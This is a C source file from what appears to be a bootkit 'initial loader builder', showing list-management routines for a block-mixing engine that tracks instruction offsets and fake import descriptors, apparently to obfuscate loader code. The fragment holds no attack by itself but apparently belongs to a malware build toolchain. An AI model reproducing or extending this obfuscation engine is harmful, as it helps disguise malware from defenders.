//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK initial loader builder. Version 2.9.2
//	
// module: instance.c
// $Revision: 39 $
// $Date: 2012-05-02 15:38:09 +0400 (Ср, 02 май 2012) $
// description: 
//	Block-mixing engine implementation.

#include "main.h"
#include "instance.h"


static PDATA_INSTANCE InstanceListGet(PLIST_ENTRY InstanceListHead, INT Index, ULONG Type)
{
	PDATA_INSTANCE Instance = NULL;
	PLIST_ENTRY pEntry = InstanceListHead->Flink;
	while(pEntry != InstanceListHead)
	{
		Instance = CONTAINING_RECORD(pEntry, DATA_INSTANCE, InstanceListEntry);
		if (Index <= Instance->InstanceId)
			break;
		Instance = NULL;
		pEntry = pEntry->Flink;
	}

	if (!Instance || Index < Instance->InstanceId)
	{
		PIMPORT_DESCRIPTOR ImpDesc = NULL;
		Instance = NULL;

//		if (Type != INSTANCE_TYPE_IMPORT || (ImpDesc = ImpFindDescriptor(Index)))
		{
			if (ImpDesc)
				Index = ImpDesc->InstanceId;	// For fake import

			if (Instance = (PDATA_INSTANCE)Alloc(sizeof(DATA_INSTANCE)))
			{
				InitializeListHead(&Instance->InstanceListEntry);
				InitializeListHead(&Instance->AccessListHead);
				Instance->AccessCount = 0;
				Instance->InstanceId = Index;
				Instance->ImportDesc = ImpDesc;
				Instance->InstanceFlags = Type;
				InsertTailList(pEntry, &Instance->InstanceListEntry);
			}	// if (Instance = 
		}	// if (ImpDesc) 
	}	// if (!Instance || Index > Instance->InstanceId)

	return(Instance);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Attaches specified imported function to the specified import list.
// Returns TRUE if there was a new function added to a list.
//
BOOL InstanceListAdd(
		PLIST_ENTRY		InstanceListHead,		// import list head
		PDATA_INSTANCE	NewInstance			// imported function descriptor
		)
{
	BOOL Ret = TRUE;
	PDATA_INSTANCE Instance = NULL;
	PLIST_ENTRY pEntry = InstanceListHead->Flink;

	while(pEntry != InstanceListHead)
	{
		Instance = CONTAINING_RECORD(pEntry, DATA_INSTANCE, InstanceListEntry);
		if (NewInstance->InstanceId <= Instance->InstanceId)
			break;
		Instance = NULL;
		pEntry = pEntry->Flink;
	}

	if (Instance && (NewInstance->InstanceId == Instance->InstanceId))
	{
		// We already have this function in the import list
		// Attach this function call list to our call list
		PLIST_ENTRY CallEntry = NewInstance->AccessListHead.Flink;

		ASSERT(!IsListEmpty(&NewInstance->AccessListHead));
		ASSERT(!IsListEmpty(&Instance->AccessListHead));

		RemoveEntryList(&NewInstance->AccessListHead);
		InsertListToTailList(&Instance->AccessListHead, CallEntry);
		Instance->AccessCount += NewInstance->AccessCount;
		Free(NewInstance);
		Ret = FALSE;
	}
	else
		// We don't have this function in our import list
		// Adding new entry.
		InsertTailList(pEntry, &NewInstance->InstanceListEntry);
	
	return(Ret);
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates an instance of specified type. Creates an access descriptor.
//
BOOL  AllocateInstance(
					PCHAR		Block, 
					PCHAR		Instruction, 
					PLIST_ENTRY InstanceListHead,
					ULONG		IndexMask,
					ULONG		InstanceType,
					ULONG		Flags
					)
{
	BOOL Ret = FALSE;
	INT Index; 
	PDATA_INSTANCE	Instance;
	PACCESS_DESCRIPTOR	AccDesc;

	Index = *(INT*)(Instruction + 1) & IndexMask;
	if (AccDesc = (PACCESS_DESCRIPTOR)Alloc(sizeof(ACCESS_DESCRIPTOR)))
	{
		if (Instance = InstanceListGet(InstanceListHead, Index, InstanceType))
		{
			InitializeListHead(&AccDesc->Entry);
			AccDesc->Flags = Flags;
			AccDesc->Instruction = (ULONG)(Instruction - Block);
			AccDesc->Length = 5;
			AccDesc->Pointer = AccDesc->Instruction + 1;
			Instance->AccessCount += 1;
			InsertTailList(&Instance->AccessListHead, &AccDesc->Entry);
			Ret = TRUE;
		}
			else
				Free((PVOID)AccDesc);
	}

	return(Ret);
}